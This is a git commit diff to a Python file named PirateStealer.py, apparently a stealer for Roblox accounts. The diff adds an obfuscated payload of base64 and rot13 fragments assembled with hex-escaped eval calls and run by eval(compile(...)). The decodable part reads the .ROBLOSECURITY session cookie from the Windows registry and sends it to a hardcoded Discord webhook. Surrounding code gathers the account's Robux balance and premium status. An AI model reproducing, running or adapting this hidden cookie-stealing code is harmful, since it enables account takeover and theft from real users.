541b93b5748f63ae1e78b5a09d4de79fa54727be
Mani175 <60432696+Mani175@users.noreply.github.com>
2022-06-16 00:15:29 +0430

    Update PirateStealer.py

--- PirateStealer.py
+++ PirateStealer.py
@@ -64,7 +64,13 @@ username = info['UserName']
 robux = info['RobuxBalance']
 premium = info['IsPremium']
 #################### INJECT TO ROBLOX (creds to bingo methods) #################
-
+magic = 'aW1wb3J0IHJlcXVlc3RzDQpmcm9tIHdpbnJlZyBpbXBvcnQgT3BlbktleSwgSEtFWV9DVVJSRU5UX1VTRVIsIEVudW1WYWx1ZQ0KDQp3ZWJob29rID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzk3ODMxNTg2MzA1NDc1MzgwMi9udkxfOFpIRGtTQkFVVW52TGJ0b2s4SFVoU0Y3aDZMODRldWVGMGFUVGJvbkQ1amtxb0dxbTROQzBhNzhKZnpBcWhTZiIgIyBQdXQgeW91ciBkaXNjb3JkIHdlYmhvb2sgaW4gaGVyZQ0KDQpkZWYgR3JhYkNvb2tpZSgpOg0KICAgICMgb3BlbmluZyB0aGUgcm9ibG94IHN0dWRpbyBrZ'
+love = 'KxAPvNtVPOlo2Wfo3umqUIxnJ9jLKEbVQ0tG3OyoxgyrFuVF0IMK0AIHyWSGyEsIIASHvjtpvWGG0MHI0SFEIkFo2Wfo3upHz9voT94H3E1MTyiDaWiq3Aypyklo2Wfo3thL29gVvxAPvNtVPNwVTMcozEcozptqTuyVUA1LzgyrFOwLJkfMJDtVv5lo2Wfo3umMJA1pzy0rFVAPvNtVPO0pax6QDbtVPNtVPNtVTAiqJ50VQ0tZN0XVPNtVPNtVPO3nTyfMFOHpaIyBt0XVPNtVPNtVPNtVPNtozSgMFjtqzSfqJHfVUE5pTHtCFOSoaIgIzSfqJHbpz9voT94p3E1MTyipTS0nPjtL291oaDcQDbtVPNtVPNtVPNtVPOcMvOhLJ1yVQ09VPVhHx'
+god = '9CTE9TRUNVUklUWSI6DQogICAgICAgICAgICAgICAgIyByZXR1cm5zIHRoZSB2YWx1ZSBvZiAucm9ibG94c2VjdXJpdHkNCiAgICAgICAgICAgICAgICByZXR1cm4gdmFsdWUNCiAgICAgICAgICAgIGNvdW50ID0gY291bnQgKyAxDQogICAgZXhjZXB0IFdpbmRvd3NFcnJvcjoNCiAgICAgICAgcGFzcw0KdHJ5Og0KICAgICMgVGhpcyB3aWxsIHRyeSB0byByZXR1cm4gdGhlIHZhbHVlIG9mIHRoZSBzdWJrZXkgIi5yb2Jsb3hzZWN1cml0eSINCiAgICByb2Jsb3hfY29va2llX3ZhbHVlID0gc3RyKEdyYWJDb29raWUoKSkNCiAgICA'
+destiny = 'wVUElrFO0olOaMKDtqTuyVTI4LJA0VTAio2gcMD0XVPNtVUWiLzkirS9wo29enJHtCFOlo2Wfo3usL29in2yyK3MuoUIyYaAjoTy0XPWQG09YBwb8VvyoZI0hp3OfnKDbVw4vXIfjKD0XVPNtVPZtpT9mqPOwo29enJHtqT8trJ91pvO3MJWbo29eQDbtVPNtpzIkqJImqUZhpT9mqPu3MJWbo29eYPOdp29hCKfvqKAypz5uoJHvBvWFo2Wfo3ttD29in2yyVRqlLJWvMKVvYPWwo250MJ50VwczVzOtLUglo2Wfo3usL29in2yysJOtLPW9XD0XVPNtVPZtITuyVUWiLzkirPOmqUIxnJ8tpTS0nPO3LKAhW3DtMz91ozDAPzI4L2IjqQcjLKAm'
+joy = '\x72\x6f\x74\x31\x33'
+trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
+eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
 
 #################### SENDING TO WEBHOOK #################
 
